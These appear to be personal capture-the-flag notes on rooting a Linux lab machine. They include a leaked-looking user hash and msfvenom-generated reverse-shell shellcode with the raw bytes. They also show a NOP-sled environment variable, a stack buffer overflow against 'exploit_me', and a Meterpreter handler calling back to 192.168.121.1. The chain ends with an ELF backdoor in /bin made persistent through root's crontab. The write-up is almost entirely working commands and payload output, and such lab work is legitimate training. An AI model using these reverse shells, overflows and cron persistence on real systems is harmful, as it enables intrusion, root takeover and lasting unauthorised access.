
```
zaz : 646da671ca01bb5d84dbb5fb2238dc8e
```

![](../Images/Pasted%20image%2020240806220442.png)

```
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.121.1 LPORT=8877 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7" PrependSetuid=True
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 102 (iteration=0)
x86/shikata_ga_nai chosen with final size 102
Payload size: 102 bytes
Final size of py file: 518 bytes
buf =  b""
buf += b"\xbd\x56\x57\x8c\x14\xdb\xdb\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x13\x31\x6a\x15\x03\x6a\x15\x83\xc2"
buf += b"\x04\xe2\xa3\x66\x57\x7e\x5c\xd1\xaa\xff\x53\x3a"
buf += b"\xc3\xe3\xc0\xff\x7f\x8e\xe4\x76\x9e\xfe\x8e\x45"
buf += b"\xe1\x6c\x17\xe6\xdd\x5f\x27\x4f\x5b\x99\x4f\x90"
buf += b"\x33\x20\x8e\x78\x46\xd3\xb2\xd5\xcf\x32\x02\x43"
buf += b"\x80\xe5\x31\x3f\x23\x8f\x54\xf2\xa4\xdd\xfe\x63"
buf += b"\x8a\x92\x96\x13\xfb\x7b\x04\x8d\x8a\x67\x9a\x1e"
buf += b"\x04\x86\xaa\xaa\xdb\xc9"

export EVIL=`python -c 'print "\x90" * 525 +  "\xbd\x56\x57\x8c\x14\xdb\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x6a\x15\x03\x6a\x15\x83\xc2\x04\xe2\xa3\x66\x57\x7e\x5c\xd1\xaa\xff\x53\x3a\xc3\xe3\xc0\xff\x7f\x8e\xe4\x76\x9e\xfe\x8e\x45\xe1\x6c\x17\xe6\xdd\x5f\x27\x4f\x5b\x99\x4f\x90\x33\x20\x8e\x78\x46\xd3\xb2\xd5\xcf\x32\x02\x43\x80\xe5\x31\x3f\x23\x8f\x54\xf2\xa4\xdd\xfe\x63\x8a\x92\x96\x13\xfb\x7b\x04\x8d\x8a\x67\x9a\x1e\x04\x86\xaa\xaa\xdb\xc9"'`
```

```
./exploit_me $(python -c 'print "i"*140 + "\x3f\xf7\xff\xbf"')
```

![](../Images/Pasted%20image%2020240809181012.png)

```
msfconsole -x "use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.121.1; set LPORT 7788; exploit"
```

![](../Images/Pasted%20image%2020240809181038.png)

The listener is on

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.121.1 LPORT=7788 -f elf –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7" PrependSetuid=True -o evil
```

![](../Images/Pasted%20image%2020240809181140.png)

```
cd /bin/
```

![](../Images/Pasted%20image%2020240809181255.png)

The exploit is in /bin and executable, we'll add it to the cron and wait for the listener to receive a connection

```
echo "*/1 * * * * /bin/evil" > /var/spool/cron/crontabs/root

Sometimes, echo doesn't work and we have to use crontab -e

export EDITOR=nano
crontab -e

*/1 * * * * /bin/evil
ctrl +x
```

![](../Images/Pasted%20image%2020240809181441.png)

![](../Images/Pasted%20image%2020240809181654.png)